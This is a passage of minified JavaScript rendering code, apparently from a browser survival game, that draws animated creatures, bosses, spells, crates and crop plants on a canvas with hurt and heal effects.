                    e = sprite[ze.VULTURE_ATTACK][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.globalAlpha = this._alpha,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = (.6 - this.hit.v) * (1 - this._alpha),
                        e = sprite[ze.HURT_VULTURE_GROUND],
                        w = -e.width * this.breath.v * this.scale,
                        h = -e.height * this.breath.v * this.scale,
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = (.6 - this.hit.v) * this._alpha,
                        e = sprite[ze.HURT_VULTURE],
                        w = -e.width * this.breath.v * this.scale,
                        h = -e.height * this.breath.v * this.scale,
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    e = sprite[ze.VULTURE_WING_LEFT_ATTACK][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.save(),
                    fe.translate(-40 * Pe, 80 * Pe),
                    fe.rotate(this.rotate.v),
                    fe.globalAlpha = this._alpha,
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = (.6 - this.hit.v) * this._alpha,
                        e = sprite[ze.HURT_VULTURE_WING_LEFT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    e = sprite[ze.VULTURE_WING_RIGHT_ATTACK][Fe.time],
                    fe.save(),
                    fe.translate(40 * Pe, 80 * Pe),
                    fe.rotate(-this.rotate.v),
                    fe.globalAlpha = this._alpha,
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = (.6 - this.hit.v) * this._alpha,
                        e = sprite[ze.HURT_VULTURE_WING_RIGHT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.globalAlpha = 1,
                    fe.restore(),
                    fe.restore()
            }
            function hn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle);
                var e = Utils.dist(this, this.r);
                this.scale = 350 < e ? Math.min(this.scale + qe / 2, 1.8) : Math.max(this.scale - qe, 1),
                    this.breath.update(),
                    this.rotate.update(),
                    this._alpha = e < 350 ? Math.max(0, this._alpha - 2.2 * qe) : Math.min(1, this._alpha + 2.2 * qe),
                    e = (0 == (1 & this.info) ? sprite[ze.HAWK_GROUND] : sprite[ze.HAWK_GROUND_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.globalAlpha = 1 - this._alpha,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    e = (0 == (1 & this.info) ? sprite[ze.HAWK] : sprite[ze.HAWK_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.globalAlpha = this._alpha,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = (.6 - this.hit.v) * (1 - this._alpha),
                        e = sprite[ze.HURT_HAWK_GROUND],
                        w = -e.width * this.breath.v * this.scale,
                        h = -e.height * this.breath.v * this.scale,
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = (.6 - this.hit.v) * this._alpha,
                        e = sprite[ze.HURT_HAWK],
                        w = -e.width * this.breath.v * this.scale,
                        h = -e.height * this.breath.v * this.scale,
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    e = (0 == (1 & this.info) ? sprite[ze.HAWK_WING_LEFT] : sprite[ze.HAWK_WING_LEFT_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.save(),
                    fe.translate(-20 * Pe, 0 * Pe),
                    fe.rotate(this.rotate.v),
                    fe.globalAlpha = this._alpha,
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = (.6 - this.hit.v) * this._alpha,
                        e = sprite[ze.HURT_HAWK_WING_LEFT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    e = (0 == (1 & this.info) ? sprite[ze.HAWK_WING_RIGHT] : sprite[ze.HAWK_WING_RIGHT_ATTACK])[Fe.time],
                    fe.save(),
                    fe.translate(20 * Pe, 0 * Pe),
                    fe.rotate(-this.rotate.v),
                    fe.globalAlpha = this._alpha,
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = (.6 - this.hit.v) * this._alpha,
                        e = sprite[ze.HURT_HAWK_WING_RIGHT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.globalAlpha = 1,
                    fe.restore(),
                    fe.restore()
            }
            function ln() {
                var e;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    300 < Utils.dist(this, this.r) ? this.scale = Math.min(this.scale + qe / 2, 1.8) : this.scale = Math.max(this.scale - qe, 1),
                    this.breath.update(),
                    this.rotate.update(),
                    e = (0 === this.info ? sprite[ze.BABY_LAVA] : sprite[ze.BABY_LAVA_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_LAVA],
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    e = (0 === this.info ? sprite[ze.BABY_LAVA_WING_LEFT] : sprite[ze.BABY_LAVA_WING_LEFT_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.save(),
                    fe.translate(-40 * Pe, 10 * Pe),
                    fe.rotate(this.rotate.v),
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_LAVA_WING_LEFT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    e = (0 === this.info ? sprite[ze.BABY_LAVA_WING_RIGHT] : sprite[ze.BABY_LAVA_WING_RIGHT_ATTACK])[Fe.time],
                    fe.save(),
                    fe.translate(40 * Pe, 10 * Pe),
                    fe.rotate(-this.rotate.v),
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_LAVA_WING_RIGHT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.restore()
            }
            function In() {
                var e;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    300 < Utils.dist(this, this.r) ? this.scale = Math.min(this.scale + qe / 2, 1.8) : this.scale = Math.max(this.scale - qe, 1),
                    this.breath.update(),
                    this.rotate.update(),
                    e = (0 === this.info ? sprite[ze.BABY_DRAGON] : sprite[ze.BABY_DRAGON_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_DRAGON],
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    e = (0 === this.info ? sprite[ze.BABY_DRAGON_WING_LEFT] : sprite[ze.BABY_DRAGON_WING_LEFT_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.save(),
                    fe.translate(-40 * Pe, 10 * Pe),
                    fe.rotate(this.rotate.v),
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_DRAGON_WING_LEFT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    e = (0 === this.info ? sprite[ze.BABY_DRAGON_WING_RIGHT] : sprite[ze.BABY_DRAGON_WING_RIGHT_ATTACK])[Fe.time],
                    fe.save(),
                    fe.translate(40 * Pe, 10 * Pe),
                    fe.rotate(-this.rotate.v),
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_DRAGON_WING_RIGHT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.restore()
            }
            function cn() {
                var e;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    300 < Utils.dist(this, this.r) ? this.scale = Math.min(this.scale + qe / 2, 1.8) : this.scale = Math.max(this.scale - qe, 1),
                    this.breath.update(),
                    this.rotate.update(),
                    e = sprite[ze.LAVA_DRAGON][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_LAVA_DRAGON],
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    e = sprite[ze.LAVA_WING_LEFT][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.save(),
                    fe.translate(-60 * Pe, 20 * Pe),
                    fe.rotate(this.rotate.v),
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_LAVA_WING_LEFT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    e = sprite[ze.LAVA_WING_RIGHT][Fe.time],
                    fe.save(),
                    fe.translate(60 * Pe, 20 * Pe),
                    fe.rotate(-this.rotate.v),
                    Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_LAVA_WING_RIGHT],
                        Ke(fe, e, -w * Pe / 4, -h * Pe / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.restore()
            }
            function On() {
                var e;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    300 < Utils.dist(this, this.r) ? this.scale = Math.min(this.scale + qe / 2, 1.8) : this.scale = Math.max(this.scale - qe, 1),
                    this.breath.update(),
                    this.rotate.update(),
                    e = sprite[ze.DRAGON][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_DRAGON],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    e = sprite[ze.WING_LEFT][Fe.time],
                    w = -e.width * this.breath.v * this.scale,
                    h = -e.height * this.breath.v * this.scale,
                    fe.save(),
                    fe.translate(-30 * Pe, 70 * Pe),
                    fe.rotate(this.rotate.v),
                    Ke(fe, e, -10 * Pe, -40 * Pe, w, h),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_WING_LEFT],
                        Ke(fe, e, -10 * Pe, -40 * Pe, w, h),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    e = sprite[ze.WING_RIGHT][Fe.time],
                    fe.save(),
                    fe.translate(30 * Pe, 70 * Pe),
                    fe.rotate(-this.rotate.v),
                    Ke(fe, e, 10 * Pe - w, -40 * Pe, w, h),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_WING_RIGHT],
                        Ke(fe, e, 10 * Pe - w, -40 * Pe, w, h),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.restore()
            }
            function gn(e) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    e === ze.GIFT && (e = ze.CRATE,
                        this.info = 36),
                    img = sprite[e][this.info][Fe.time],
                    w = -img.width / 2,
                    h = -img.height / 2,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = Er(this.info, img, __EFFECT_BOX__),
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function pn(e, t) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    e = sprite[e][Fe.time],
                    w = -e.width,
                    h = -e.height,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[t],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function Rn() {
                var e;
                this.breath.update(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    e = (0 === this.info ? sprite[ze.BABY_MAMMOTH] : sprite[ze.BABY_MAMMOTH_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v,
                    h = -e.height * this.breath.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BABY_MAMMOTH],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function Cn() {
                var e;
                this.breath.update(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    e = (0 === this.info ? sprite[ze.BOAR] : sprite[ze.BOAR_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v,
                    h = -e.height * this.breath.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_BOAR],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function bn() {
                var e, t = Math.PI / 2, i = Math.PI / 4;
                this.breath.update(),
                    this.breathl.update(),
                    this.breathr.update(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    e = (0 === this.info ? sprite[ze.CRAB_BOSS] : sprite[ze.CRAB_BOSS_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v,
                    h = -e.height * this.breath.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_CRAB_BOSS],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    this.action & R.COLD && (this.heal.update() && 0 == this.heal.o && (this.action -= R.COLD),
                        fe.globalAlpha = .6 - this.heal.v,
                        e = sprite[ze.HEAL_CRAB_BOSS],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle + i),
                    fe.translate(100, 0),
                    fe.rotate(t),
                    e = (0 === this.info ? sprite[ze.CRAB_BOSS_CLAW_LEFT] : sprite[ze.CRAB_BOSS_CLAW_LEFT_ATTACK])[Fe.time],
                    w = -e.width * this.breathl.v,
                    h = -e.height * this.breathl.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_CRAB_BOSS_CLAW_LEFT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    this.action & R.COLD && (fe.globalAlpha = .6 - this.heal.v,
                        e = sprite[ze.HEAL_CRAB_BOSS_CLAW_LEFT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle + t + i),
                    fe.translate(100, 0),
                    fe.rotate(t),
                    e = (0 === this.info ? sprite[ze.CRAB_BOSS_CLAW_RIGHT] : sprite[ze.CRAB_BOSS_CLAW_RIGHT_ATTACK])[Fe.time],
                    w = -e.width * this.breathr.v,
                    h = -e.height * this.breathr.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_CRAB_BOSS_CLAW_RIGHT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    this.action & R.COLD && (fe.globalAlpha = .6 - this.heal.v,
                        e = sprite[ze.HEAL_CRAB_BOSS_CLAW_RIGHT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function Nn() {
                var e, t = Math.PI / 2, i = Math.PI / 4;
                this.breath.update(),
                    this.breathl.update(),
                    this.breathr.update(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    e = (0 === this.info ? sprite[ze.CRAB] : sprite[ze.CRAB_ATTACK])[Fe.time],
                    w = -e.width * this.breath.v,
                    h = -e.height * this.breath.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_CRAB],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    this.action & R.COLD && (this.heal.update() && 0 == this.heal.o && (this.action -= R.COLD),
                        fe.globalAlpha = .6 - this.heal.v,
                        e = sprite[ze.HEAL_CRAB],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle + i),
                    fe.translate(55, 0),
                    fe.rotate(t),
                    e = (0 === this.info ? sprite[ze.CRAB_CLAW_LEFT] : sprite[ze.CRAB_CLAW_LEFT_ATTACK])[Fe.time],
                    w = -e.width * this.breathl.v,
                    h = -e.height * this.breathl.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_CRAB_CLAW_LEFT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    this.action & R.COLD && (fe.globalAlpha = .6 - this.heal.v,
                        e = sprite[ze.HEAL_CRAB_CLAW_LEFT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore(),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle + t + i),
                    fe.translate(55, 0),
                    fe.rotate(t),
                    e = (0 === this.info ? sprite[ze.CRAB_CLAW_RIGHT] : sprite[ze.CRAB_CLAW_RIGHT_ATTACK])[Fe.time],
                    w = -e.width * this.breathr.v,
                    h = -e.height * this.breathr.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[ze.HURT_CRAB_CLAW_RIGHT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    this.action & R.COLD && (fe.globalAlpha = .6 - this.heal.v,
                        e = sprite[ze.HEAL_CRAB_CLAW_RIGHT],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function Sn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.born = Math.min(1, this.born + 2 * qe),
                    fe.globalAlpha = Math.min(1, Math.max(0, Utils.dist(this, this.r) / 80)) * this.born,
                    this.breath.update(),
                    img = sprite[ze.SPELL][Fe.time][this.spell],
                    h = this.spell < 2 ? (w = -img.width * this.breath.v,
                        -img.height * this.breath.v) : 0 === this.fly ? (w = -img.width,
                            -img.height) : (w = 1.35 * -img.width,
                                1.35 * -img.height),
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.globalAlpha = 1,
                    fe.restore()
            }
            function mn(e, t) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.breath.update(),
                    e = sprite[e][Fe.time],
                    w = -e.width * this.breath.v,
                    h = -e.height * this.breath.v,
                    Ke(fe, e, -w / 2, -h / 2, w, h),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[t],
                        Ke(fe, e, -w / 2, -h / 2, w, h),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function Dn(e, t) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.breath.update(),
                    e = sprite[e][Fe.time],
                    w = -e.width * this.breath.v,
                    h = -e.height * this.breath.v,
                    Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                    this.action & R.HURT && (this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                        fe.globalAlpha = .6 - this.hit.v,
                        e = sprite[t],
                        Ke(fe, e, -w / 4, -h / 4, w / 2, h / 2),
                        fe.globalAlpha = 1),
                    fe.restore()
            }
            function vn(e, t, i) {
                fe.save(),
                    fe.translate(xe.cam.x + t, xe.cam.y + i),
                    fe.rotate(this.angle),
                    fe.translate(this.x - t, this.y - i),
                    this.breath.update(),
                    img = sprite[e][Fe.time],
                    w = -img.width * this.breath.v,
                    h = -img.height * this.breath.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function Mn(e) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.breath.update(),
                    img = sprite[e][Fe.time],
                    w = -img.width * this.breath.v,
                    h = -img.height * this.breath.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function fn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.PLANT_THORNBUSH_DRIED] : sprite[ze.PLANT_THORNBUSH])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (i = (16 & this.info ? sprite[ze.DRIED_THORNBUSH] : sprite[ze.THORNBUSH])[Fe.time],
                        fe.translate(0, i.height / 2),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function Ln() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.PLANT_GARLIC_DRIED] : sprite[ze.PLANT_GARLIC])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (i = (16 & this.info ? sprite[ze.DRIED_GARLIC] : sprite[ze.GARLIC])[Fe.time],
                        fe.translate(0, i.height / 2),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function Gn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.PLANT_ALOE_VERA_DRIED] : sprite[ze.PLANT_ALOE_VERA])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (i = (16 & this.info ? sprite[ze.DRIED_ALOE_VERA] : sprite[ze.ALOE_VERA_GROWN])[Fe.time],
                        fe.translate(0, i.height / 2),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function yn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.PLANT_WATERMELON_DRIED] : sprite[ze.PLANT_WATERMELON])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (i = (16 & this.info ? sprite[ze.DRIED_WATERMELON] : sprite[ze.WATERMELON])[Fe.time],
                        fe.translate(0, i.height / 2),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function Hn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.PLANT_CARROT_DRIED] : sprite[ze.PLANT_CARROT])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (i = (16 & this.info ? sprite[ze.DRIED_CARROT] : sprite[ze.CARROT])[Fe.time],
                        fe.translate(0, i.height / 2),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function Pn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
